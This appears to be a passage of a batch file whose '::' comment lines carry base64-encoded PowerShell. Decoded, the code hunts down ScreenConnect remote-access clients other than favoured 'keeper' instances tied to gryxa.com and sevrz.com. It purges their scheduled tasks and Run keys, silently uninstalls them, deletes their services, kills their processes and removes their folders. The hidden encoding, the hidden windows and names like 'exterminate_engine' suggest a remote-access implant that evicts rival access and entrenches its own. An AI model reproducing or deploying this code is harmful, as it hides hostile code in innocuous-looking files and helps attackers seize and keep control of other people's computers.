::b3duX2VtcHR5XyIgKyBbZ3VpZF06Ok5ld0d1aWQoKS5Ub1N0cmluZygnTicpKQ0K
::ICAgICAgICAgICAgTmV3LUl0ZW0gLUl0ZW1UeXBlIERpcmVjdG9yeSAtUGF0aCAk
::ZW1wdHkgLUZvcmNlIHwgT3V0LU51bGwNCiAgICAgICAgICAgICYgcm9ib2NvcHku
::ZXhlICRlbXB0eSAkZCAvTUlSIC9SOjAgL1c6MCAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgICAgIFJlbW92ZS1JdGVtIC1MaXRlcmFsUGF0aCAkZW1wdHkgLUZvcmNl
::IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgICAgICBSZW1v
::dmUtSXRlbSAtTGl0ZXJhbFBhdGggJGQgLVJlY3Vyc2UgLUZvcmNlIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIH0NCiAgICAgICAgcmV0dXJu
::IC1ub3QgKFRlc3QtUGF0aCAtTGl0ZXJhbFBhdGggJGQpDQogICAgfQ0KICAgIGZ1
::bmN0aW9uIFVuaW5zdGFsbC1Qcm9kdWN0S2V5KCRrZXkpIHsNCiAgICAgICAgJGd1
::aWQgPSAka2V5LlBTQ2hpbGROYW1lDQogICAgICAgICRwcm9wID0gR2V0LUl0ZW1Q
::cm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZQ0KICAgICAgICAkZG4gPSAkcHJvcC5EaXNwbGF5TmFtZQ0KICAgICAgICAjIEwz
::OS9MNDQ6IHJlZnVzZSAveCBpZiBEaXNwbGF5TmFtZSBGUCBpcyBhIGtlZXBlciBP
::UiBHcnl4YSBQcm9kdWN0Q29kZSAoc2hhcmVkIEdVSUQga2lsbHMgR3Vlc3QpDQog
::ICAgICAgIGlmICgkZ3VpZCAtZXEgJ3s5RDdDQzQxOC1BMzU2LTk2OTMtRENDNS00
::MUVDNDREMDNCMzF9Jykgew0KICAgICAgICAgICAgTG9nICJwcm9kdWN0X3NraXBf
::Z3J5eGFfcHJvZHVjdGNvZGUgZ3VpZD0kZ3VpZCINCiAgICAgICAgICAgIHJldHVy
::biAkZmFsc2UNCiAgICAgICAgfQ0KICAgICAgICBpZiAoJGRuIC1tYXRjaCAnU2Ny
::ZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAtOWEtZkEtRl17MTZ9KVwpJykgew0KICAg
::ICAgICAgICAgJGZwRG4gPSAkTWF0Y2hlc1sxXS5Ub0xvd2VyKCkNCiAgICAgICAg
::ICAgIGlmICgkZnBEbiAtaW4gJGtlZXAgLW9yIChUZXN0LUlzR3J5eGFGcCAkZnBE
::bikpIHsNCiAgICAgICAgICAgICAgICBMb2cgInByb2R1Y3Rfc2tpcF9rZWVwZXJf
::ZnAgWyRkbl0gZ3VpZD0kZ3VpZCINCiAgICAgICAgICAgICAgICByZXR1cm4gJGZh
::bHNlDQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgaWYgKCRndWlk
::IC1saWtlICd7Kn0nKSB7DQogICAgICAgICAgICAkcCA9IFN0YXJ0LVByb2Nlc3Mg
::bXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAiL3ggJGd1aWQgL3FuIC9ub3Jlc3Rh
::cnQgUkVCT09UPVJlYWxseVN1cHByZXNzIiAtV2FpdCAtUGFzc1RocnUgLVdpbmRv
::d1N0eWxlIEhpZGRlbg0KICAgICAgICAgICAgTG9nICJwcm9kdWN0X21zaWV4ZWMg
::WyRkbl0gZ3VpZD0kZ3VpZCBleGl0PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAg
::ICAgaWYgKCRwLkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKSB7IHJl
::dHVybiAkdHJ1ZSB9DQogICAgICAgIH0NCiAgICAgICAgJHVzID0gJHByb3AuVW5p
::bnN0YWxsU3RyaW5nDQogICAgICAgIGlmICgkdXMpIHsNCiAgICAgICAgICAgIHRy
::eSB7DQogICAgICAgICAgICAgICAgaWYgKCR1cyAtbWF0Y2ggJyg/aSltc2lleGVj
::Jykgew0KICAgICAgICAgICAgICAgICAgICAkYXJncyA9ICgkdXMgLXJlcGxhY2Ug
::Jyg/aSleLiptc2lleGVjKFwuZXhlKT9ccyonLCAnJykNCiAgICAgICAgICAgICAg
::ICAgICAgaWYgKCRhcmdzIC1ub3RtYXRjaCAnL3FuJykgeyAkYXJncyA9ICIkYXJn
::cyAvcW4gL25vcmVzdGFydCIgfQ0KICAgICAgICAgICAgICAgICAgICAkcCA9IFN0
::YXJ0LVByb2Nlc3MgbXNpZXhlYy5leGUgLUFyZ3VtZW50TGlzdCAkYXJncyAtV2Fp
::dCAtUGFzc1RocnUgLVdpbmRvd1N0eWxlIEhpZGRlbg0KICAgICAgICAgICAgICAg
::ICAgICBMb2cgInByb2R1Y3RfdW5pbnN0YWxsc3RyaW5nX21zaSBbJGRuXSBleGl0
::PSQoJHAuRXhpdENvZGUpIg0KICAgICAgICAgICAgICAgICAgICByZXR1cm4gKCRw
::LkV4aXRDb2RlIC1pbiAwLCAxNjA1LCAxNjE0LCAzMDEwKQ0KICAgICAgICAgICAg
::ICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgICRwID0gU3RhcnQtUHJv
::Y2VzcyBjbWQuZXhlIC1Bcmd1bWVudExpc3QgIi9jICR1cyAvUyAvc2lsZW50IC9x
::dWlldCAvcW4iIC1XYWl0IC1QYXNzVGhydSAtV2luZG93U3R5bGUgSGlkZGVuDQog
::ICAgICAgICAgICAgICAgICAgIExvZyAicHJvZHVjdF91bmluc3RhbGxzdHJpbmdf
::ZXhlIFskZG5dIGV4aXQ9JCgkcC5FeGl0Q29kZSkiDQogICAgICAgICAgICAgICAg
::ICAgIHJldHVybiAoJHAuRXhpdENvZGUgLWVxIDApDQogICAgICAgICAgICAgICAg
::fQ0KICAgICAgICAgICAgfSBjYXRjaCB7IExvZyAicHJvZHVjdF91bmluc3RhbGxz
::dHJpbmdfRkFJTCBbJGRuXSAkXyIgfQ0KICAgICAgICB9DQogICAgICAgIHJldHVy
::biAkZmFsc2UNCiAgICB9DQoNCiAgICAjIOKUgOKUgCBkZXN0cm95IGZvcmVpZ24v
::b2xkIFNDIHBlcnNpc3RlbmNlICh3YXRjaGRvZyB0YXNrcyArIHJ1biBrZXlzKSDi
::lIDilIANCiAgICAjIFJvb3QgY2F1c2Ugb2YgImNvbm5lY3RzIHRoZW4gZHJvcHMi
::OiBhIG5vbi1rZWVwZXIgLyBvbGQtRlAgU2NyZWVuQ29ubmVjdCBrZWVwcyBhDQog
::ICAgIyBzY2hlZHVsZWQgdGFzayBvciBSdW4ga2V5IHRoYXQgcmUtcnVucyBpdHMg
::Y2FjaGVkIG1zaWV4ZWMgL2kuIEV2ZXJ5IHN1Y2ggL2kgZmlyZXMNCiAgICAjIFJl
::bW92ZUV4aXN0aW5nUHJvZHVjdHMgb24gdGhlIFNIQVJFRCBTQyBVcGdyYWRlQ29k
::ZSBhbmQgc3RyaXBzIHRoZSBrZWVwZXIgR3J5eGEuDQogICAgIyBSZW1vdmluZyBv
::bmx5IHRoZSBwcm9kdWN0IGlzIG5vdCBlbm91Z2gg4oCUIHRoZSBwZXJzaXN0ZW5j
::ZSByZWluc3RhbGxzIGl0IChhbmQga2lsbHMNCiAgICAjIEdyeXhhIGFnYWluKS4g
::UHVyZ2UgdGhlIHBlcnNpc3RlbmNlIEZJUlNUIHNvIHByb2R1Y3Qvc3ZjL2RpciBy
::ZW1vdmFsIGlzIHBlcm1hbmVudC4NCiAgICBmdW5jdGlvbiBHZXQtTm9uS2VlcGVy
::U2NGcHMgew0KICAgICAgICAkZnBzID0gQHt9DQogICAgICAgIEdldC1TZXJ2aWNl
::IC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qg
::ew0KICAgICAgICAgICAgaWYgKCRfLk5hbWUgLW1hdGNoICdTY3JlZW5Db25uZWN0
::IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICAg
::ICAgJGZwc1skbWF0Y2hlc1sxXS5Ub0xvd2VyKCldID0gJHRydWUNCiAgICAgICAg
::ICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBHZXQtQ2ltSW5zdGFuY2UgV2luMzJf
::UHJvY2VzcyAtRmlsdGVyICJOYW1lIGxpa2UgJ1NjcmVlbkNvbm5lY3QlJyIgLUVy
::cm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9iamVjdCB7DQog
::ICAgICAgICAgICBpZiAoIiQoW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aCkgJChb
::c3RyaW5nXSRfLkNvbW1hbmRMaW5lKSIgLW1hdGNoICdcKChbMC05YS1mQS1GXXsx
::Nn0pXCknKSB7DQogICAgICAgICAgICAgICAgJGZwc1skbWF0Y2hlc1sxXS5Ub0xv
::d2VyKCldID0gJHRydWUNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAg
::ICBmb3JlYWNoICgkcm9vdCBpbiAkc2NyaXB0OlVuaW5zdGFsbFJvb3RzKSB7DQog
::ICAgICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAg
::ICAgICAgICRkbiA9IChHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAg
::ICAgICBpZiAoJGRuIC1tYXRjaCAnU2NyZWVuQ29ubmVjdCBDbGllbnQgXCgoWzAt
::OWEtZkEtRl17MTZ9KVwpJykgeyAkZnBzWyRtYXRjaGVzWzFdLlRvTG93ZXIoKV0g
::PSAkdHJ1ZSB9DQogICAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgICAgZm9y
::ZWFjaCAoJGJhc2UgaW4gQCgkZW52OlByb2dyYW1GaWxlcywgJHtlbnY6UHJvZ3Jh
::bUZpbGVzKHg4Nil9KSkgew0KICAgICAgICAgICAgaWYgKC1ub3QgJGJhc2UgLW9y
::IC1ub3QgKFRlc3QtUGF0aCAkYmFzZSkpIHsgY29udGludWUgfQ0KICAgICAgICAg
::ICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGggJGJhc2UgLURpcmVjdG9yeSAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNoLU9i
::amVjdCB7DQogICAgICAgICAgICAgICAgaWYgKCRfLk5hbWUgLW1hdGNoICdTY3Jl
::ZW5Db25uZWN0IENsaWVudCBcKChbMC05YS1mQS1GXXsxNn0pXCknKSB7ICRmcHNb
::JG1hdGNoZXNbMV0uVG9Mb3dlcigpXSA9ICR0cnVlIH0NCiAgICAgICAgICAgIH0N
::CiAgICAgICAgfQ0KICAgICAgICBAKCRmcHMuS2V5cyB8IFdoZXJlLU9iamVjdCB7
::ICRfIC1ub3RpbiAka2VlcCB9KQ0KICAgIH0NCg0KICAgIGZ1bmN0aW9uIFRlc3Qt
::U2NLZWVwZXJSZWYoW3N0cmluZ10kcykgew0KICAgICAgICBpZiAoLW5vdCAkcykg
::eyByZXR1cm4gJGZhbHNlIH0NCiAgICAgICAgaWYgKCRzIC1tYXRjaCAnKD9pKWdy
::eXhhXC5jb218c2V2cnpcLmNvbScpIHsgcmV0dXJuICR0cnVlIH0NCiAgICAgICAg
::aWYgKCRzIC1tYXRjaCAnKD9pKW93bihfbW9ufF9saWJ8X3NlY3VyZSk/XC4oY21k
::fHBzMSl8Z3J5eGFfYm9vdHxcLnd1Y2FjaGUnKSB7IHJldHVybiAkdHJ1ZSB9DQog
::ICAgICAgIGZvcmVhY2ggKCRrIGluICRrZWVwKSB7IGlmICgkayAtYW5kICRzIC1s
::aWtlICIqJGsqIikgeyByZXR1cm4gJHRydWUgfSB9DQogICAgICAgIHJldHVybiAk
::ZmFsc2UNCiAgICB9DQoNCiAgICBmdW5jdGlvbiBSZW1vdmUtU2NQZXJzaXN0ZW5j
::ZShbc3RyaW5nXSRGcCkgew0KICAgICAgICAjIEwzOTogcHVyZ2UgU2NyZWVuQ29u
::bmVjdCBwZXJzaXN0ZW5jZSByZWZlcmVuY2luZyB0aGlzIEZQIE9SIGdlbmVyaWMg
::U0MgaW5zdGFsbGVycw0KICAgICAgICAjIHRoYXQgYXJlIG5vdCBrZWVwZXItcHJv
::dGVjdGVkIChiYXJlIG1zaWV4ZWMgL2kgVVJMIHdhdGNoZG9ncyB3aXRob3V0IEZQ
::IGxpdGVyYWwpLg0KICAgICAgICB0cnkgew0KICAgICAgICAgICAgR2V0LVNjaGVk
::dWxlZFRhc2sgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfCBGb3JFYWNo
::LU9iamVjdCB7DQogICAgICAgICAgICAgICAgJHRhc2sgPSAkXw0KICAgICAgICAg
::ICAgICAgICRibG9iID0gJycNCiAgICAgICAgICAgICAgICBmb3JlYWNoICgkYSBp
::biAkdGFzay5BY3Rpb25zKSB7ICRibG9iICs9ICIgJCgkYS5FeGVjdXRlKSAkKCRh
::LkFyZ3VtZW50cykiIH0NCiAgICAgICAgICAgICAgICBpZiAoJGJsb2IgLW5vdG1h
::dGNoICcoP2kpU2NyZWVuQ29ubmVjdHxtc2lleGVjJykgeyByZXR1cm4gfQ0KICAg
::ICAgICAgICAgICAgIGlmIChUZXN0LVNjS2VlcGVyUmVmICRibG9iKSB7IHJldHVy
::biB9DQogICAgICAgICAgICAgICAgJGhpdCA9ICRmYWxzZQ0KICAgICAgICAgICAg
::ICAgIGlmICgkRnAgLWFuZCAkYmxvYiAtbWF0Y2ggW3JlZ2V4XTo6RXNjYXBlKCRG
::cCkpIHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAgICBlbHNlaWYgKCRi
::bG9iIC1tYXRjaCAnKD9pKVNjcmVlbkNvbm5lY3RcLkNsaWVudFNldHVwfFNjcmVl
::bkNvbm5lY3QgQ2xpZW50fHBrZ19ncnl4YVwubXNpfHBrZ1wubXNpJykgeyAkaGl0
::ID0gJHRydWUgfQ0KICAgICAgICAgICAgICAgIGlmICgkaGl0KSB7DQogICAgICAg
::ICAgICAgICAgICAgIFVucmVnaXN0ZXItU2NoZWR1bGVkVGFzayAtVGFza05hbWUg
::JHRhc2suVGFza05hbWUgLVRhc2tQYXRoICR0YXNrLlRhc2tQYXRoIC1Db25maXJt
::OiRmYWxzZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAg
::ICAgICAgICAgICBMb2cgInBlcnNpc3RfdGFza19yZW1vdmVkICQoJHRhc2suVGFz
::a1BhdGgpJCgkdGFzay5UYXNrTmFtZSkgZnA9JEZwIg0KICAgICAgICAgICAgICAg
::IH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBjYXRjaCB7IExvZyAicGVyc2lz
::dF90YXNrX2VudW1fZXJyICRfIiB9DQogICAgICAgIGZvcmVhY2ggKCRyayBpbiBA
::KCdIS0xNOlxTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lv
::blxSdW4nLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdB
::UkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZScsDQog
::ICAgICAgICAgICAgICAgICAgICAgICAgICdIS0xNOlxTT0ZUV0FSRVxXT1c2NDMy
::Tm9kZVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLA0KICAg
::ICAgICAgICAgICAgICAgICAgICAgICAnSEtMTTpcU09GVFdBUkVcV09XNjQzMk5v
::ZGVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuT25jZScsDQog
::ICAgICAgICAgICAgICAgICAgICAgICAgICdIS0NVOlxTT0ZUV0FSRVxNaWNyb3Nv
::ZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxSdW4nLA0KICAgICAgICAgICAgICAg
::ICAgICAgICAgICAnSEtDVTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3NcQ3Vy
::cmVudFZlcnNpb25cUnVuT25jZScpKSB7DQogICAgICAgICAgICBpZiAoLW5vdCAo
::VGVzdC1QYXRoICRyaykpIHsgY29udGludWUgfQ0KICAgICAgICAgICAgJHAgPSBH
::ZXQtSXRlbVByb3BlcnR5ICRyayAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
::ZQ0KICAgICAgICAgICAgaWYgKC1ub3QgJHApIHsgY29udGludWUgfQ0KICAgICAg
::ICAgICAgZm9yZWFjaCAoJHByb3AgaW4gJHAuUFNPYmplY3QuUHJvcGVydGllcykg
::ew0KICAgICAgICAgICAgICAgIGlmICgkcHJvcC5OYW1lIC1saWtlICdQUyonKSB7
::IGNvbnRpbnVlIH0NCiAgICAgICAgICAgICAgICAkdiA9IFtzdHJpbmddJHByb3Au
::VmFsdWUNCiAgICAgICAgICAgICAgICBpZiAoVGVzdC1TY0tlZXBlclJlZiAkdikg
::eyBjb250aW51ZSB9DQogICAgICAgICAgICAgICAgaWYgKCR2IC1ub3RtYXRjaCAn
::KD9pKVNjcmVlbkNvbm5lY3R8bXNpZXhlYycpIHsgY29udGludWUgfQ0KICAgICAg
::ICAgICAgICAgICRoaXQgPSAkZmFsc2UNCiAgICAgICAgICAgICAgICBpZiAoJEZw
::IC1hbmQgJHYgLW1hdGNoIFtyZWdleF06OkVzY2FwZSgkRnApKSB7ICRoaXQgPSAk
::dHJ1ZSB9DQogICAgICAgICAgICAgICAgZWxzZWlmICgkdiAtbWF0Y2ggJyg/aSlT
::Y3JlZW5Db25uZWN0XC5DbGllbnRTZXR1cHxTY3JlZW5Db25uZWN0IENsaWVudCcp
::IHsgJGhpdCA9ICR0cnVlIH0NCiAgICAgICAgICAgICAgICBpZiAoJGhpdCkgew0K
::ICAgICAgICAgICAgICAgICAgICBSZW1vdmUtSXRlbVByb3BlcnR5IC1QYXRoICRy
::ayAtTmFtZSAkcHJvcC5OYW1lIC1Gb3JjZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlD
::b250aW51ZQ0KICAgICAgICAgICAgICAgICAgICBMb2cgInBlcnNpc3RfcnVua2V5
::X3JlbW92ZWQgJHJrXCQoJHByb3AuTmFtZSkgZnA9JEZwIg0KICAgICAgICAgICAg
::ICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIExv
::ZyAnZXh0ZXJtaW5hdGVfZW5naW5lX0w3X2JlZ2luJw0KDQogICAgIyBwdXJnZSBw
::ZXJzaXN0ZW5jZSBmb3IgZXZlcnkgbm9uLWtlZXBlciBTQyBmaW5nZXJwcmludCBC
::RUZPUkUgcHJvZHVjdC9zdmMvZGlyIHJlbW92YWwsDQogICAgIyBzbyBhbiBvbGQv
::Zm9yZWlnbiBTQyB3YXRjaGRvZyBjYW5ub3QgcmVpbnN0YWxsIGl0c2VsZiAoYW5k
::IGNyb3NzLWtpbGwgR3J5eGEpIG1pZC1wYXNzLg0KICAgIGZvcmVhY2ggKCRmcFgg
::aW4gKEdldC1Ob25LZWVwZXJTY0ZwcykpIHsNCiAgICAgICAgUmVtb3ZlLVNjUGVy
::c2lzdGVuY2UgJGZwWA0KICAgIH0NCg0KICAgICMgMS4gZm9yZWlnbiBTQyBwcm9k
::dWN0cyBmcm9tIEJPVEggY29ycmVjdCBBUlAgaGl2ZXMNCiAgICAkc2VlbiA9IEB7
::fQ0KICAgIGZvcmVhY2ggKCRyb290IGluICRzY3JpcHQ6VW5pbnN0YWxsUm9vdHMp
::IHsNCiAgICAgICAgaWYgKC1ub3QgKFRlc3QtUGF0aCAkcm9vdCkpIHsgTG9nICJo
::aXZlX21pc3NpbmcgJHJvb3QiOyBjb250aW51ZSB9DQogICAgICAgIExvZyAiaGl2
::ZV9zY2FuICRyb290Ig0KICAgICAgICBHZXQtQ2hpbGRJdGVtICRyb290IC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAgICAgJHByb3AgPSBHZXQtSXRlbVByb3BlcnR5ICRfLlBTUGF0aCAtRXJy
::b3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgICAgICAgICAgJGRuID0gJHBy
::b3AuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlmICgtbm90ICRkbikgeyByZXR1
::cm4gfQ0KICAgICAgICAgICAgaWYgKCRkbiAtbm90bWF0Y2ggJyg/aSlTY3JlZW5D
::b25uZWN0XHMrQ2xpZW50XHMqXCgoWzAtOUEtRmEtZl17MTZ9KVwpJykgeyByZXR1
::cm4gfQ0KICAgICAgICAgICAgJGZwID0gJE1hdGNoZXNbMV0uVG9Mb3dlcigpDQog
::ICAgICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1cm4gfQ0KICAgICAg
::ICAgICAgJHVzID0gJHByb3AuVW5pbnN0YWxsU3RyaW5nDQogICAgICAgICAgICBp
::ZiAoJHVzIC1hbmQgJHVzIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKSB7IExvZyAi
::cHJvZHVjdF9za2lwX2dyeXhhX3JlbGF5IFskZG5dIjsgcmV0dXJuIH0NCiAgICAg
::ICAgICAgIGlmICgkc2Vlbi5Db250YWluc0tleSgkXy5QU0NoaWxkTmFtZSkpIHsg
::cmV0dXJuIH0NCiAgICAgICAgICAgICRzZWVuWyRfLlBTQ2hpbGROYW1lXSA9ICR0
::cnVlDQogICAgICAgICAgICBpZiAoVW5pbnN0YWxsLVByb2R1Y3RLZXkgJF8pIHsg
::JG4ucHJvZHVjdCsrIH0gZWxzZSB7ICRuLmZhaWwrKzsgTG9nICJwcm9kdWN0X1JF
::TU9WRV9GQUlMRUQgWyRkbl0iIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgICMg
::Mi4gZm9yZWlnbiBTQyBzZXJ2aWNlcyAoc2tpcCBpZiBrZWVwZXIgRlAgb3IgcmVs
::YXkgaXMgZ3J5eGEuY29tKQ0KICAgIGZvcmVhY2ggKCRzdmMgaW4gKEdldC1TZXJ2
::aWNlIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgV2hlcmUtT2JqZWN0
::IHsgJF8uTmFtZSAtbGlrZSAnU2NyZWVuQ29ubmVjdCBDbGllbnQqJyB9KSkgew0K
::ICAgICAgICBpZiAoSXMtS2VlcGVyICRzdmMuTmFtZSkgeyBjb250aW51ZSB9DQog
::ICAgICAgICRpbWcgPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAiSEtMTTpcU1lTVEVNXEN1
::cnJlbnRDb250cm9sU2V0XFNlcnZpY2VzXCQoJHN2Yy5OYW1lKSIgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUpLkltYWdlUGF0aA0KICAgICAgICBpZiAoSXMt
::S2VlcGVyICRpbWcpIHsgTG9nICJzdmNfc2tpcF9ncnl4YV9yZWxheSAkKCRzdmMu
::TmFtZSkiOyBjb250aW51ZSB9DQogICAgICAgICYgc2MuZXhlIHN0b3AgIiQoJHN2
::Yy5OYW1lKSIgMj4mMSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1N
::aWxsaXNlY29uZHMgNjAwDQogICAgICAgICYgc2MuZXhlIGRlbGV0ZSAiJCgkc3Zj
::Lk5hbWUpIiAyPiYxIHwgT3V0LU51bGwNCiAgICAgICAgJG4uc3ZjKys7IExvZyAi
::c3ZjX2RlbGV0ZWQgJCgkc3ZjLk5hbWUpIg0KICAgIH0NCg0KICAgICMgMy4gZm9y
::ZWlnbiBTQyBwcm9jZXNzZXMg4oCUIE9OTFkgaWYgcGF0aC9jbWRsaW5lIGVtYmVk
::cyBhIE5PTi1rZWVwZXIgRlAuDQogICAgIyBPNDE6IG51bGwgRXhlY3V0YWJsZVBh
::dGggdXNlZCB0byBraWxsIEdyeXhhIENsaWVudFNlcnZpY2UgZXZlcnkgdGljayDi
::hpIgcmVpbnN0YWxsIGxvb3AuDQogICAgR2V0LUNpbUluc3RhbmNlIFdpbjMyX1By
::b2Nlc3MgLUZpbHRlciAiTmFtZSBsaWtlICdTY3JlZW5Db25uZWN0JSciIC1FcnJv
::ckFjdGlvbiBTaWxlbnRseUNvbnRpbnVlIHwgRm9yRWFjaC1PYmplY3Qgew0KICAg
::ICAgICAkZXhlID0gW3N0cmluZ10kXy5FeGVjdXRhYmxlUGF0aA0KICAgICAgICAk
::Y21kID0gW3N0cmluZ10kXy5Db21tYW5kTGluZQ0KICAgICAgICAkYmxvYiA9ICIk
::ZXhlICRjbWQiDQogICAgICAgIGlmIChJcy1LZWVwZXIgJGJsb2IpIHsgcmV0dXJu
::IH0NCiAgICAgICAgaWYgKCRibG9iIC1tYXRjaCAnKD9pKWdyeXhhXC5jb20nKSB7
::IExvZyAicHJvY19za2lwX2dyeXhhX3JlbGF5IHBpZD0kKCRfLlByb2Nlc3NJZCki
::OyByZXR1cm4gfQ0KICAgICAgICBpZiAoJGJsb2IgLW5vdG1hdGNoICdcKChbMC05
::YS1mQS1GXXsxNn0pXCknKSB7DQogICAgICAgICAgICBMb2cgInByb2Nfc2tpcF9u
::b19mcCBwaWQ9JCgkXy5Qcm9jZXNzSWQpIG5hbWU9JCgkXy5OYW1lKSINCiAgICAg
::ICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgICRmcCA9ICRNYXRjaGVz
::WzFdLlRvTG93ZXIoKQ0KICAgICAgICBpZiAoJGZwIC1pbiAka2VlcCkgeyByZXR1
::cm4gfQ0KICAgICAgICBTdG9wLVByb2Nlc3MgLUlkICRfLlByb2Nlc3NJZCAtRm9y
::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgJG4ucHJv
::YysrOyBMb2cgInByb2Nfa2lsbGVkIHBpZD0kKCRfLlByb2Nlc3NJZCkgZnA9JGZw
::IGV4ZT0kZXhlIg0KICAgIH0NCg0KICAgICMgNC4gZm9yZWlnbiBTQyBpbnN0YWxs
::IGRpcnMgKFBGICsgUEY4NikNCiAgICBmb3JlYWNoICgkYmFzZSBpbiBAKCRlbnY6
::UHJvZ3JhbUZpbGVzLCAke2VudjpQcm9ncmFtRmlsZXMoeDg2KX0pKSB7DQogICAg
::ICAgIGlmICgtbm90ICRiYXNlIC1vciAtbm90IChUZXN0LVBhdGggJGJhc2UpKSB7
::IGNvbnRpbnVlIH0NCiAgICAgICAgR2V0LUNoaWxkSXRlbSAtTGl0ZXJhbFBhdGgg
::JGJhc2UgLURpcmVjdG9yeSAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0IHsgJF8uTmFtZSAtbGlr
::ZSAnU2NyZWVuQ29ubmVjdConIH0gfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAg
::ICAgICAgICAgJGQgPSAkXy5GdWxsTmFtZQ0KICAgICAgICAgICAgICAgIGlmIChJ
::cy1LZWVwZXIgJGQpIHsgcmV0dXJuIH0NCiAgICAgICAgICAgICAgICAjIGRpciBj
::YXJyaWVzIG5vIEZQL3JlbGF5IGluIGl0cyBuYW1lOyBwcm90ZWN0IHRoZSBvbmUg
::YmFja2luZyBhIGtlZXBlci9ncnl4YSBzZXJ2aWNlDQogICAgICAgICAgICAgICAg
::JGxlYWYgPSAkXy5OYW1lDQogICAgICAgICAgICAgICAgJHN2Y0hlcmUgPSBHZXQt
::U2VydmljZSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IFdoZXJlLU9i
::amVjdCB7ICRfLk5hbWUgLWxpa2UgJ1NjcmVlbkNvbm5lY3QgQ2xpZW50KicgfSB8
::IFdoZXJlLU9iamVjdCB7DQogICAgICAgICAgICAgICAgICAgICRpbSA9IChHZXQt
::SXRlbVByb3BlcnR5ICJIS0xNOlxTWVNURU1cQ3VycmVudENvbnRyb2xTZXRcU2Vy
::dmljZXNcJCgkXy5OYW1lKSIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUp
::LkltYWdlUGF0aA0KICAgICAgICAgICAgICAgICAgICAkaW0gLWFuZCAoJGltIC1s
::aWtlICIqJGxlYWYqIikNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAg
::ICAgaWYgKCRzdmNIZXJlKSB7IExvZyAiZGlyX3NraXBfbGl2ZV9zdmMgJGQiOyBy
::ZXR1cm4gfQ0KICAgICAgICAgICAgICAgIGlmIChGb3JjZS1SZW1vdmVEaXIgJGQp
::IHsgJG4uZGlyKys7IExvZyAiZGlyX3JlbW92ZWQgJGQiIH0NCiAgICAgICAgICAg
::ICAgICBlbHNlIHsgJG4uZmFpbCsrOyBMb2cgImRpcl9SRU1PVkVfRkFJTEVEICRk
::IiB9DQogICAgICAgICAgICB9DQogICAgfQ0KDQogICAgIyA1LiBkaXNhbGxvd2Vk
